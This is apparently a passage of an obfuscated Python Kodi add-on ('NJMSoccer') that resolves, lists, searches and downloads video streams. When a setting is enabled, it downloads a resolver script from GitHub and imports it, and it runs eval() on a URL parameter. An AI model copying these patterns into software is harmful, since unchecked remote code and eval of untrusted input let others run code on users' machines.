 if 61 - 61: iIii1I11I1II1 - O00oOoOoO0o0O / Oo0ooO0oo0oO * O00oOoOoO0o0O % O0oo0OO0 % Oo0ooO0oo0oO
def OooOOOO ( url ) :
 if Ii1IIii11 . getSetting ( 'Updatecommonresolvers' ) == 'true' :
  i1II11II1 = os . path . join ( I11 , 'genesisresolvers.py' )
  if xbmcvfs . exists ( i1II11II1 ) :
   os . remove ( i1II11II1 )
   if 63 - 63: iii1I1I % iIii1I11I1II1
  II1ii = 'https://raw.githubusercontent.com/lambda81/lambda-addons/master/plugin.video.genesis/commonresolvers.py'
  o00iIiiiII = urllib . urlretrieve ( II1ii , i1II11II1 )
  Ii1IIii11 . setSetting ( 'Updatecommonresolvers' , 'false' )
 try :
  import genesisresolvers
 except Exception :
  xbmc . executebuiltin ( "XBMC.Notification(NJMSoccer,Please enable Update Commonresolvers to Play in Settings. - ,10000)" )
  if 5 - 5: OoooooooOO / OOooOOo % O00oOoOoO0o0O % I1ii11iIi11i * Oo0ooO0oo0oO + iIii1I11I1II1
 I11iiI11iiI = genesisresolvers . get ( url ) . result
 if url == I11iiI11iiI or I11iiI11iiI is None :
  if 51 - 51: Ii1I . iIii1I11I1II1 + I1ii11iIi11i * O0oo0OO0 + i1IIi
  xbmc . executebuiltin ( "XBMC.Notification(NJMSoccer,Using Urlresolver module.. - ,5000)" )
  import urlresolver
  ooO0OOo0 = urlresolver . HostedMediaFile ( url )
  if ooO0OOo0 :
   iIII11Iiii1 = urlresolver . resolve ( url )
   I11iiI11iiI = iIII11Iiii1
 if I11iiI11iiI :
  if isinstance ( I11iiI11iiI , list ) :
   for i11i11 in I11iiI11iiI :
    o0oo0 = Ii1IIii11 . getSetting ( 'quality' )
    if i11i11 [ 'quality' ] == 'HD' :
     iIII11Iiii1 = i11i11 [ 'url' ]
     break
    elif i11i11 [ 'quality' ] == 'SD' :
     iIII11Iiii1 = i11i11 [ 'url' ]
    elif i11i11 [ 'quality' ] == '1080p' and Ii1IIii11 . getSetting ( '1080pquality' ) == 'true' :
     iIII11Iiii1 = i11i11 [ 'url' ]
     break
  else :
   iIII11Iiii1 = I11iiI11iiI
 return iIII11Iiii1
def OoO0OOoO0Oo0 ( name , mu_playlist ) :
 import urlparse
 if Ii1IIii11 . getSetting ( 'ask_playlist_items' ) == 'true' :
  oO00O = [ ]
  for O0i1II1Iiii1I11 in mu_playlist :
   II111IiiiI1 = urlparse . urlparse ( O0i1II1Iiii1I11 ) . netloc
   if II111IiiiI1 == '' :
    oO00O . append ( name )
   else :
    oO00O . append ( II111IiiiI1 )
  iIIIiiI1i1i = xbmcgui . Dialog ( )
  I1IIII1i = iIIIiiI1i1i . select ( 'Choose a video source' , oO00O )
  if I1IIII1i >= 0 :
   if "&mode=19" in mu_playlist [ I1IIII1i ] :
    xbmc . Player ( ) . play ( OooOOOO ( mu_playlist [ I1IIII1i ] . replace ( '&mode=19' , '' ) ) )
   elif "$doregex" in mu_playlist [ I1IIII1i ] :
    if 75 - 75: i11Ii11I1Ii1i
    iI1ii1Ii = mu_playlist [ I1IIII1i ] . split ( '&regexs=' )
    if 78 - 78: iIii1I11I1II1 * oOo0O0Ooo . oOo0O0Ooo - iii1I1I . iIii1I11I1II1
    Ii1I1Ii , OOo = I11I ( iI1ii1Ii [ 1 ] , iI1ii1Ii [ 0 ] )
    xbmc . Player ( ) . play ( Ii1I1Ii )
   else :
    Ii1I1Ii = mu_playlist [ I1IIII1i ]
    xbmc . Player ( ) . play ( Ii1I1Ii )
 else :
  I1i11ii11 = xbmc . PlayList ( 1 )
  I1i11ii11 . clear ( )
  II1i = 0
  for O0i1II1Iiii1I11 in mu_playlist :
   II1i += 1
   I111I1I = xbmcgui . ListItem ( '%s) %s' % ( str ( II1i ) , name ) )
   I1i11ii11 . add ( O0i1II1Iiii1I11 , I111I1I )
   xbmc . executebuiltin ( 'playlist.playoffset(video,0)' )
   if 54 - 54: oO0OooOoO + O00oOoOoO0o0O % O00oOoOoO0o0O % OOooOOo
   if 25 - 25: Oo0ooO0oo0oO - oOo0O0Ooo
def Iii1IIIIIII ( name , url ) :
 if Ii1IIii11 . getSetting ( 'save_location' ) == "" :
  xbmc . executebuiltin ( "XBMC.Notification('NJMSoccer','Choose a location to save files.',15000," + oO + ")" )
  Ii1IIii11 . openSettings ( )
 OOooOooo0OOo0 = { 'url' : url , 'download_path' : Ii1IIii11 . getSetting ( 'save_location' ) }
 downloader . download ( name , OOooOooo0OOo0 )
 iIIIiiI1i1i = xbmcgui . Dialog ( )
 oOOoOoo0O0 = iIIIiiI1i1i . yesno ( 'NJMSoccer' , 'Do you want to add this file as a source?' )
 if oOOoOoo0O0 :
  I1I11 ( os . path . join ( Ii1IIii11 . getSetting ( 'save_location' ) , name ) )
  if 27 - 27: I1ii11iIi11i + oO0o * i11Ii11I1Ii1i
  if 83 - 83: iIii1I11I1II1
def iIIIIii1 ( name , url , mode , iconimage , fanart , description , genre , date , credits , showcontext = False ) :
 if 72 - 72: O00oOoOoO0o0O
 oO00 = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name ) + "&fanart=" + urllib . quote_plus ( fanart )
 OOo00O = True
 if date == '' :
  date = None
 else :
  description += '\n\nDate: %s' % date
 oOOO00O0O0OOo = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 oOOO00O0O0OOo . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description , "Genre" : genre , "dateadded" : date , "credits" : credits } )
 oOOO00O0O0OOo . setProperty ( "Fanart_Image" , fanart )
 if showcontext :
  IIiIiiI1i = [ ]
  if showcontext == 'source' :
   if name in str ( OO00O0O0O00Oo ) :
    IIiIiiI1i . append ( ( 'Remove from Sources' , 'XBMC.RunPlugin(%s?mode=8&name=%s)' % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) ) ) )
  elif showcontext == 'download' :
   IIiIiiI1i . append ( ( 'Download' , 'XBMC.RunPlugin(%s?url=%s&mode=9&name=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( url ) , urllib . quote_plus ( name ) ) ) )
  elif showcontext == 'fav' :
   IIiIiiI1i . append ( ( 'Remove from NJMSoccer Favorites' , 'XBMC.RunPlugin(%s?mode=6&name=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) ) ) )
   if 49 - 49: I11i . I1i1iI1i . i1IIi * oO0o % iIii1I11I1II1
  if not name in o0oOo0Ooo0O :
   IIiIiiI1i . append ( ( 'Add to NJMSoccer Favorites' , 'XBMC.RunPlugin(%s?mode=5&name=%s&url=%s&iconimage=%s&fanart=%s&fav_mode=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) , urllib . quote_plus ( url ) , urllib . quote_plus ( iconimage ) , urllib . quote_plus ( fanart ) , mode ) ) )
  oOOO00O0O0OOo . addContextMenuItems ( IIiIiiI1i )
 OOo00O = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = oO00 , listitem = oOOO00O0O0OOo , isFolder = True )
 if 35 - 35: I11i + II - oO0o % Ii1I % OOooOOo % oO0o
 return OOo00O
def ii1IIiII111I ( url , title , media_type = 'video' ) :
 if 87 - 87: O0oo0OO0 - I11i % I11i . Ii1I / I11i
 if 6 - 6: oO0o / iIii1I11I1II1 * OoooooooOO * i11iIiiIii
 import youtubedl
 if not url == '' :
  if media_type == 'audio' :
   youtubedl . single_YD ( url , download = True , audio = True )
  else :
   youtubedl . single_YD ( url , download = True )
 elif xbmc . Player ( ) . isPlaying ( ) == True :
  import YDStreamExtractor
  if YDStreamExtractor . isDownloading ( ) == True :
   if 79 - 79: I1i1iI1i % I1ii11iIi11i
   YDStreamExtractor . manageDownloads ( )
  else :
   Oo0oOO = xbmc . Player ( ) . getPlayingFile ( )
   if 86 - 86: iIii1I11I1II1 / O0
   Oo0oOO = Oo0oOO . split ( '|User-Agent=' ) [ 0 ]
   I111I1I = { 'url' : Oo0oOO , 'title' : title , 'media_type' : media_type }
   youtubedl . single_YD ( '' , download = True , dl_info = I111I1I )
 else :
  xbmc . executebuiltin ( "XBMC.Notification(DOWNLOAD,First Play [COLOR yellow]WHILE playing download[/COLOR] ,10000)" )
  if 17 - 17: oO0OooOoO
def iiIiii ( site_name , search_term = None ) :
 O0ooooOOoo0O = ''
 if os . path . exists ( oOo0oooo00o ) == False or Ii1IIii11 . getSetting ( 'clearseachhistory' ) == 'true' :
  Oo0oOooOoOo ( oOo0oooo00o , '' )
  Ii1IIii11 . setSetting ( "clearseachhistory" , "false" )
 if site_name == 'history' :
  oOooO = OO0o ( oOo0oooo00o )
  i1 = re . compile ( '(.+?):(.*?)(?:\r|\n)' ) . findall ( oOooO )
  if 39 - 39: o0Oo + oOo0O0Ooo
  for iI1i11iII111 , search_term in i1 :
   if 'plugin://' in search_term :
    oOoOo0O0OOOoO ( search_term , iI1i11iII111 , O0ooooOOoo0O , '' , '' , '' , '' , '' , None , '' , total = int ( len ( i1 ) ) )
   else :
    iIIIIii1 ( iI1i11iII111 + ':' + search_term , iI1i11iII111 , 26 , oO , i1iiIIiiI111 , '' , '' , '' , '' )
 if not search_term :
  o0o0o0oO0oOO = xbmc . Keyboard ( '' , 'Enter Search Term' )
  o0o0o0oO0oOO . doModal ( )
  if ( o0o0o0oO0oOO . isConfirmed ( ) == False ) :
   return
  search_term = o0o0o0oO0oOO . getText ( )
  if len ( search_term ) == 0 :
   return
 search_term = search_term . replace ( ' ' , '+' )
 search_term = search_term . encode ( 'utf-8' )
 if 'youtube' in site_name :
  if 83 - 83: i1IIi
  import _ytplist
  if 76 - 76: O0oo0OO0 + iIii1I11I1II1 + oO0o . I1ii11iIi11i
  i1i1 = { }
  i1i1 = _ytplist . YoUTube ( 'searchYT' , youtube = search_term , max_page = 4 , nosave = 'nosave' )
  IIIIiI11I11 = len ( i1i1 )
  for II1i in i1i1 :
   try :
    iI1i11iII111 = i1i1 [ II1i ] [ 'title' ]
    I1 = i1i1 [ II1i ] [ 'date' ]
    try :
     o0oOoOo0 = i1i1 [ II1i ] [ 'desc' ]
    except Exception :
     o0oOoOo0 = 'UNAVAIABLE'
     if 38 - 38: OOooOOo % II + i11iIiiIii + Oo0ooO0oo0oO + i11Ii11I1Ii1i / i11iIiiIii
    Ii1I1Ii = 'plugin://plugin.video.youtube/play/?video_id=' + i1i1 [ II1i ] [ 'url' ]
    O0ooooOOoo0O = 'http://img.youtube.com/vi/' + i1i1 [ II1i ] [ 'url' ] + '/0.jpg'
    oOoOo0O0OOOoO ( Ii1I1Ii , iI1i11iII111 , O0ooooOOoo0O , '' , '' , '' , '' , '' , None , '' , IIIIiI11I11 )
   except Exception :
    III1ii1iII ( 'This item is ignored::' )
  o0OOOOOo0 = site_name + ':' + search_term + '\n'
  Oo0oOooOoOo ( os . path . join ( i11 , 'history' ) , o0OOOOOo0 , append = True )
 elif 'dmotion' in site_name :
  oooOoO = "https://api.dailymotion.com"
  if 62 - 62: iii1I1I / oO0OooOoO + oO0o % i11Ii11I1Ii1i / oO0o + I11i
  import _DMsearch
  IiI11I111 = str ( Ii1IIii11 . getSetting ( 'familyFilter' ) )
  _DMsearch . listVideos ( oooOoO + "/videos?fields=description,duration,id,owner.username,taken_time,thumbnail_large_url,title,views_total&search=" + search_term + "&sort=relevance&limit=100&family_filter=" + IiI11I111 + "&localization=en_EN&page=1" )
  if 54 - 54: O0 - Oo0ooO0oo0oO . iii1I1I % Oo0ooO0oo0oO + Oo0ooO0oo0oO
  o0OOOOOo0 = site_name + ':' + search_term + '\n'
  Oo0oOooOoOo ( os . path . join ( i11 , 'history' ) , o0OOOOOo0 , append = True )
 elif 'IMDBidplay' in site_name :
  oooOoO = "http://www.omdbapi.com/?t="
  Ii1I1Ii = oooOoO + search_term
  if 36 - 36: iii1I1I % i11iIiiIii
  oo = dict ( { 'User-Agent' : 'Mozilla/5.0 (Windows NT 6.3; rv:33.0) Gecko/20100101 Firefox/33.0' , 'Referer' : 'http://joker.org/' , 'Accept-Encoding' : 'gzip, deflate' , 'Content-Type' : 'application/json;charset=utf-8' , 'Accept' : 'application/json, text/plain, */*' } )
  if 47 - 47: i1IIi + oO0OooOoO . oOo0O0Ooo * Ii1I . O00oOoOoO0o0O / i1IIi
  I1iii11 = requests . get ( Ii1I1Ii , headers = oo )
  iIii11I = I1iii11 . json ( )
  i11ii = iIii11I [ 'Response' ]
  if i11ii == 'True' :
   oOOOOO0Ooooo = iIii11I [ 'imdbID' ]
   iI1i11iII111 = iIii11I [ 'Title' ] + iIii11I [ 'Released' ]
   iIIIiiI1i1i = xbmcgui . Dialog ( )
   oOOoOoo0O0 = iIIIiiI1i1i . yesno ( 'Check Movie Title' , 'PLAY :: %s ?' % iI1i11iII111 )
   if oOOoOoo0O0 :
    Ii1I1Ii = 'plugin://plugin.video.pulsar/movie/' + oOOOOO0Ooooo + '/play'
    o0OOOOOo0 = iI1i11iII111 + ':' + Ii1I1Ii + '\n'
    Oo0oOooOoOo ( oOo0oooo00o , o0OOOOOo0 , append = True )
    return Ii1I1Ii
  else :
   xbmc . executebuiltin ( "XBMC.Notification(NJMSoccer,No IMDB match found ,7000," + oO + ")" )
   if 57 - 57: O0oo0OO0 - OoooooooOO
def OOoOO0O0o0 ( string ) :
 if isinstance ( string , basestring ) :
  if isinstance ( string , unicode ) :
   string = string . encode ( 'ascii' , 'ignore' )
 return string
def I1II1oOOoo ( string , encoding = 'utf-8' ) :
 if isinstance ( string , basestring ) :
  if not isinstance ( string , unicode ) :
   string = unicode ( string , encoding , 'ignore' )
 return string
def I1oo ( s ) : return "" . join ( filter ( lambda iiI1IIIii : ord ( iiI1IIIii ) < 128 , s ) )
if 24 - 24: o0Oo . II % O0oo0OO0
def OOoooo0oo ( command ) :
 iIii11I = ''
 try :
  iIii11I = xbmc . executeJSONRPC ( I1II1oOOoo ( command ) )
 except UnicodeEncodeError :
  iIii11I = xbmc . executeJSONRPC ( OOoOO0O0o0 ( command ) )
  if 92 - 92: Ii1I / iii1I1I . I11i
 return I1II1oOOoo ( iIii11I )
 if 30 - 30: O0oo0OO0 . I11i / iii1I1I
 if 2 - 2: I1i1iI1i % o0Oo - II
def o00Oo0oooooo ( ) :
 oooOo = xbmc . getSkinDir ( )
 if oooOo == 'skin.confluence' :
  xbmc . executebuiltin ( 'Container.SetViewMode(500)' )
 elif oooOo == 'skin.aeon.nox' :
  xbmc . executebuiltin ( 'Container.SetViewMode(511)' )
 else :
  xbmc . executebuiltin ( 'Container.SetViewMode(500)' )
  if 79 - 79: Ii1I - oO0OooOoO
  if 43 - 43: i1IIi + O0 % I1ii11iIi11i / O0oo0OO0 * o0Oo
def OoO ( url ) :
 i1iI11Iii = I1II1oOOoo ( '{"jsonrpc":"2.0","method":"Files.GetDirectory","params":{"directory":"%s","media":"video","properties":["thumbnail","title","year","dateadded","fanart","rating","season","episode","studio"]},"id":1}' ) % url
 if 91 - 91: iii1I1I + i11Ii11I1Ii1i % o0Oo - i11Ii11I1Ii1i - Ii1I
 i1iiiii = json . loads ( OOoooo0oo ( i1iI11Iii ) )
 for O0i1II1Iiii1I11 in i1iiiii [ 'result' ] [ 'files' ] :
  url = O0i1II1Iiii1I11 [ 'file' ]
  iI1i11iII111 = I1oo ( O0i1II1Iiii1I11 [ 'label' ] )
  O0ooooOOoo0O = I1oo ( O0i1II1Iiii1I11 [ 'thumbnail' ] )
  try :
   o0O0OOO0Ooo = I1oo ( O0i1II1Iiii1I11 [ 'fanart' ] )
  except Exception :
   o0O0OOO0Ooo = ''
  try :
   I1 = O0i1II1Iiii1I11 [ 'year' ]
  except Exception :
   I1 = ''
  try :
   o0o0oo0Ooo = O0i1II1Iiii1I11 [ 'episode' ]
   iI1i = O0i1II1Iiii1I11 [ 'season' ]
   if o0o0oo0Ooo == - 1 or iI1i == - 1 :
    o0oOoOo0 = ''
   else :
    o0oOoOo0 = '[COLOR yellow] S' + str ( iI1i ) + '[/COLOR][COLOR hotpink] E' + str ( o0o0oo0Ooo ) + '[/COLOR]'
  except Exception :
   o0oOoOo0 = ''
  try :
   i11I = O0i1II1Iiii1I11 [ 'studio' ]
   if i11I :
    o0oOoOo0 += '\n Studio:[COLOR steelblue] ' + i11I [ 0 ] + '[/COLOR]'
  except Exception :
   i11I = ''
   if 56 - 56: Oo0ooO0oo0oO . II
  if O0i1II1Iiii1I11 [ 'filetype' ] == 'file' :
   oOoOo0O0OOOoO ( url , iI1i11iII111 , O0ooooOOoo0O , o0O0OOO0Ooo , o0oOoOo0 , '' , I1 , '' , None , '' , total = len ( i1iiiii [ 'result' ] [ 'files' ] ) )
   if 3 - 3: O0oo0OO0 + II . i1IIi / iii1I1I % II
   if 98 - 98: I1i1iI1i * iIii1I11I1II1 . O0oo0OO0 * oOo0O0Ooo / I11i + i11Ii11I1Ii1i
  else :
   iIIIIii1 ( iI1i11iII111 , url , 53 , O0ooooOOoo0O , o0O0OOO0Ooo , o0oOoOo0 , '' , I1 , '' )
   if 25 - 25: Ii1I
   if 19 - 19: o0Oo % O0oo0OO0 . I1i1iI1i * i11Ii11I1Ii1i
def oOoOo0O0OOOoO ( url , name , iconimage , fanart , description , genre , date , showcontext , playlist , regexs , total , setCookie = "" ) :
 IIiIiiI1i = [ ]
 try :
  name = name . encode ( 'utf-8' )
 except : pass
 OOo00O = True
 if 89 - 89: oO0o . iii1I1I
 if regexs :
  IIIIIiI11Ii = '17'
  if 41 - 41: i11iIiiIii - i1IIi / oOo0O0Ooo * I1i1iI1i / II - oOo0O0Ooo
  IIiIiiI1i . append ( ( '[COLOR white]!!Download Currently Playing!![/COLOR]' , 'XBMC.RunPlugin(%s?url=%s&mode=21&name=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( url ) , urllib . quote_plus ( name ) ) ) )
 elif any ( x in url for x in i1IiI1I11 ) and url . startswith ( 'http' ) :
  IIIIIiI11Ii = '19'
  if 56 - 56: O0
  IIiIiiI1i . append ( ( '[COLOR white]!!Download Currently Playing!![/COLOR]' , 'XBMC.RunPlugin(%s?url=%s&mode=21&name=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( url ) , urllib . quote_plus ( name ) ) ) )
 elif url . endswith ( '&mode=18' ) :
  url = url . replace ( '&mode=18' , '' )
  IIIIIiI11Ii = '18'
  if 45 - 45: oO0o - I1ii11iIi11i - oO0o
  IIiIiiI1i . append ( ( '[COLOR white]!!Download!![/COLOR]' , 'XBMC.RunPlugin(%s?url=%s&mode=23&name=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( url ) , urllib . quote_plus ( name ) ) ) )
  if Ii1IIii11 . getSetting ( 'dlaudioonly' ) == 'true' :
   IIiIiiI1i . append ( ( '!!Download [COLOR seablue]Audio!![/COLOR]' , 'XBMC.RunPlugin(%s?url=%s&mode=24&name=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( url ) , urllib . quote_plus ( name ) ) ) )
 elif url . startswith ( 'magnet:?xt=' ) or '.torrent' in url :
  if 41 - 41: oOo0O0Ooo / i1IIi / oOo0O0Ooo - Oo0ooO0oo0oO . OOooOOo
  if '&' in url and not '&amp;' in url :
   url = url . replace ( '&' , '&amp;' )
  url = 'plugin://plugin.video.pulsar/play?uri=' + url
  IIIIIiI11Ii = '12'
  if 65 - 65: O0 * i11iIiiIii . OoooooooOO / o0Oo / Oo0ooO0oo0oO
 else :
  IIIIIiI11Ii = '12'
  if 69 - 69: i11Ii11I1Ii1i % i11Ii11I1Ii1i
  IIiIiiI1i . append ( ( '[COLOR white]!!Download Currently Playing!![/COLOR]' , 'XBMC.RunPlugin(%s?url=%s&mode=21&name=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( url ) , urllib . quote_plus ( name ) ) ) )
 oO00 = sys . argv [ 0 ] + "?"
 Ooo00OOOOOO0 = False
 if 15 - 15: O00oOoOoO0o0O / OOooOOo + O0oo0OO0
 if playlist :
  if Ii1IIii11 . getSetting ( 'add_playlist' ) == "false" :
   oO00 += "url=" + urllib . quote_plus ( url ) + "&mode=" + IIIIIiI11Ii
  else :
   oO00 += "mode=13&name=%s&playlist=%s" % ( urllib . quote_plus ( name ) , urllib . quote_plus ( str ( playlist ) . replace ( ',' , '||' ) ) )
   name = name + '[COLOR magenta] (' + str ( len ( playlist ) ) + ' items )[/COLOR]'
   Ooo00OOOOOO0 = True
 else :
  oO00 += "url=" + urllib . quote_plus ( url ) + "&mode=" + IIIIIiI11Ii
 if regexs :
  oO00 += "&regexs=" + regexs
 if not setCookie == '' :
  oO00 += "&setCookie=" + urllib . quote_plus ( setCookie )
  if 76 - 76: O0oo0OO0 + OoooooooOO / iii1I1I % I1ii11iIi11i / I11i
 if date == '' :
  date = None
 else :
  description += '\n\nDate: %s' % date
 oOOO00O0O0OOo = xbmcgui . ListItem ( name , iconImage = "DefaultVideo.png" , thumbnailImage = iconimage )
 oOOO00O0O0OOo . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description , "Genre" : genre , "dateadded" : date } )
 oOOO00O0O0OOo . setProperty ( "Fanart_Image" , fanart )
 if 38 - 38: II . Oo0ooO0oo0oO . o0Oo * I1ii11iIi11i
 if ( not Ooo00OOOOOO0 ) and not any ( x in url for x in IIiIiII11i ) :
  if regexs :
   if '$pyFunction:playmedia(' not in urllib . unquote_plus ( regexs ) and 'notplayable' not in urllib . unquote_plus ( regexs ) :
    oOOO00O0O0OOo . setProperty ( 'IsPlayable' , 'true' )
  else :
   oOOO00O0O0OOo . setProperty ( 'IsPlayable' , 'true' )
 else :
  III1ii1iII ( 'NOT setting isplayable' + url )
  if 69 - 69: OOooOOo % i11iIiiIii / O0oo0OO0
 if showcontext :
  IIiIiiI1i = [ ]
  if showcontext == 'fav' :
   IIiIiiI1i . append (
 ( 'Remove from NJMSoccer Favorites' , 'XBMC.RunPlugin(%s?mode=6&name=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) ) )
 )
  elif not name in o0oOo0Ooo0O :
   ooOOO00oOOooO = (
 '%s?mode=5&name=%s&url=%s&iconimage=%s&fanart=%s&fav_mode=0'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) , urllib . quote_plus ( url ) , urllib . quote_plus ( iconimage ) , urllib . quote_plus ( fanart ) )
 )
   if playlist :
    ooOOO00oOOooO += 'playlist=' + urllib . quote_plus ( str ( playlist ) . replace ( ',' , '||' ) )
   if regexs :
    ooOOO00oOOooO += "&regexs=" + regexs
   IIiIiiI1i . append ( ( 'Add to NJMSoccer Favorites' , 'XBMC.RunPlugin(%s)' % ooOOO00oOOooO ) )
  oOOO00O0O0OOo . addContextMenuItems ( IIiIiiI1i )
  if 46 - 46: iIii1I11I1II1 . i11iIiiIii - oO0o % O0 / oO0OooOoO * i1IIi
 if not playlist is None :
  if Ii1IIii11 . getSetting ( 'add_playlist' ) == "false" :
   oOIiiIIi = name . split ( ') ' ) [ 1 ]
   OoOo0OO0oooo = [
 ( 'Play ' + oOIiiIIi + ' PlayList' , 'XBMC.RunPlugin(%s?mode=13&name=%s&playlist=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( oOIiiIIi ) , urllib . quote_plus ( str ( playlist ) . replace ( ',' , '||' ) ) ) )
 ]
   oOOO00O0O0OOo . addContextMenuItems ( OoOo0OO0oooo )
   if 40 - 40: II - oO0o * O00oOoOoO0o0O - I1i1iI1i / oO0o
 OOo00O = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = oO00 , listitem = oOOO00O0O0OOo , totalItems = total )
 return OOo00O
 if 71 - 71: Ii1I / OoooooooOO % I1i1iI1i / oO0o % II
def I1i1iI ( url , name , iconimage , setresolved = True ) :
 if setresolved :
  oOOO00O0O0OOo = xbmcgui . ListItem ( name , iconImage = iconimage )
  oOOO00O0O0OOo . setInfo ( type = 'Video' , infoLabels = { 'Title' : name } )
  oOOO00O0O0OOo . setProperty ( "IsPlayable" , "true" )
  oOOO00O0O0OOo . setPath ( str ( url ) )
  xbmcplugin . setResolvedUrl ( int ( sys . argv [ 1 ] ) , True , oOOO00O0O0OOo )
 else :
  xbmc . executebuiltin ( 'XBMC.RunPlugin(' + url + ')' )
  if 30 - 30: O00oOoOoO0o0O % oO0o / I11i * O0 * O0oo0OO0 . o0Oo
  if 46 - 46: oO0o - O0
  if 70 - 70: O00oOoOoO0o0O + oOo0O0Ooo * iIii1I11I1II1 . o0Oo * O00oOoOoO0o0O
  if 49 - 49: OOooOOo
def iIi1 ( link ) :
 Ii1I1Ii = urllib . urlopen ( link )
 I11iiI = Ii1I1Ii . read ( )
 Ii1I1Ii . close ( )
 i1iIii1i111 = I11iiI . split ( "Jetzt" )
 OOooo000OooO = i1iIii1i111 [ 1 ] . split ( 'programm/detail.php?const_id=' )
 o0o0OoOo = OOooo000OooO [ 1 ] . split ( '<br /><a href="/' )
 IiI1 = o0o0OoOo [ 0 ] [ 40 : len ( o0o0OoOo [ 0 ] ) ]
 iiIiII = OOooo000OooO [ 2 ] . split ( "</a></p></div>" )
 IIiiiI1iI = iiIiII [ 0 ] [ 17 : len ( iiIiII [ 0 ] ) ]
 IIiiiI1iI = IIiiiI1iI . encode ( 'utf-8' )
 return "  - " + IIiiiI1iI + " - " + IiI1
 if 100 - 100: i11Ii11I1Ii1i / i11Ii11I1Ii1i - iii1I1I % iii1I1I * Ii1I / I1i1iI1i
 if 32 - 32: o0Oo + I11i - Ii1I + I11i / i1IIi * Ii1I
def OOo00OoO ( url , regex ) :
 iIii11I = Oo0O0OOOoo ( url )
 try :
  II1i = re . findall ( regex , iIii11I ) [ 0 ]
  return II1i
 except :
  III1ii1iII ( 'regex failed' )
  III1ii1iII ( regex )
  return
  if 90 - 90: O0oo0OO0 % Ii1I
  if 6 - 6: OoooooooOO / i11iIiiIii / II
xbmcplugin . setContent ( int ( sys . argv [ 1 ] ) , 'movies' )
if 60 - 60: o0Oo % Ii1I / OOooOOo % Ii1I * i11iIiiIii / Oo0ooO0oo0oO
try :
 xbmcplugin . addSortMethod ( int ( sys . argv [ 1 ] ) , xbmcplugin . SORT_METHOD_UNSORTED )
except :
 pass
try :
 xbmcplugin . addSortMethod ( int ( sys . argv [ 1 ] ) , xbmcplugin . SORT_METHOD_LABEL )
except :
 pass
try :
 xbmcplugin . addSortMethod ( int ( sys . argv [ 1 ] ) , xbmcplugin . SORT_METHOD_DATE )
except :
 pass
try :
 xbmcplugin . addSortMethod ( int ( sys . argv [ 1 ] ) , xbmcplugin . SORT_METHOD_GENRE )
except :
 pass
 if 34 - 34: II - iii1I1I
OOooOooo0OOo0 = ii1II1II ( )
if 25 - 25: Ii1I % o0Oo + i11iIiiIii + O0 * OoooooooOO
Ii1I1Ii = None
iI1i11iII111 = None
IIIIIiI11Ii = None
I1i11ii11 = None
oOo0 = None
o0O0OOO0Ooo = i1iiIIiiI111
I1i11ii11 = None
ooO0 = None
O0o = None
if 94 - 94: O00oOoOoO0o0O . o0Oo
try :
 Ii1I1Ii = urllib . unquote_plus ( OOooOooo0OOo0 [ "url" ] ) . decode ( 'utf-8' )
except :
 pass
try :
 iI1i11iII111 = urllib . unquote_plus ( OOooOooo0OOo0 [ "name" ] )
except :
 pass
try :
 oOo0 = urllib . unquote_plus ( OOooOooo0OOo0 [ "iconimage" ] )
except :
 pass
try :
 o0O0OOO0Ooo = urllib . unquote_plus ( OOooOooo0OOo0 [ "fanart" ] )
except :
 pass
try :
 IIIIIiI11Ii = int ( OOooOooo0OOo0 [ "mode" ] )
except :
 pass
try :
 I1i11ii11 = eval ( urllib . unquote_plus ( OOooOooo0OOo0 [ "playlist" ] ) . replace ( '||' , ',' ) )
except :
 pass
try :
 ooO0 = int ( OOooOooo0OOo0 [ "fav_mode" ] )
except :
 pass
try :
 O0o = OOooOooo0OOo0 [ "regexs" ]
except :
 pass
 if 73 - 73: i1IIi / oO0OooOoO
III1ii1iII ( "Mode: " + str ( IIIIIiI11Ii ) )
if not Ii1I1Ii is None :
 III1ii1iII ( "URL: " + str ( Ii1I1Ii . encode ( 'utf-8' ) ) )
III1ii1iII ( "Name: " + str ( iI1i11iII111 ) )
if 45 - 45: O0oo0OO0 / i11Ii11I1Ii1i . OoooooooOO + I1ii11iIi11i
if IIIIIiI11Ii == None :
 III1ii1iII ( "Index" )
 oOooOOo00Oo0O ( )
 if 51 - 51: Oo0ooO0oo0oO % i11iIiiIii % I1i1iI1i + II % I11i
 if 16 - 16: oO0o / oOo0O0Ooo + O0 - oO0o . OoooooooOO
elif IIIIIiI11Ii == 1 :
 III1ii1iII ( "getData" )
 OOOOoOoo0O0O0 ( Ii1I1Ii , o0O0OOO0Ooo )
 xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
 if 19 - 19: OOooOOo
elif IIIIIiI11Ii == 2 :
 III1ii1iII ( "getChannelItems" )
 iII1i11IIi1i ( iI1i11iII111 , Ii1I1Ii , o0O0OOO0Ooo )
 xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
 if 73 - 73: II * oOo0O0Ooo * oO0o
elif IIIIIiI11Ii == 3 :
 III1ii1iII ( "getSubChannelItems" )
 I11Iiii1I ( iI1i11iII111 , Ii1I1Ii , o0O0OOO0Ooo )
 xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
 if 65 - 65: i11iIiiIii + oOo0O0Ooo * OoooooooOO - I1ii11iIi11i
elif IIIIIiI11Ii == 4 :
 III1ii1iII ( "getFavorites" )
 OooOo ( )
 xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
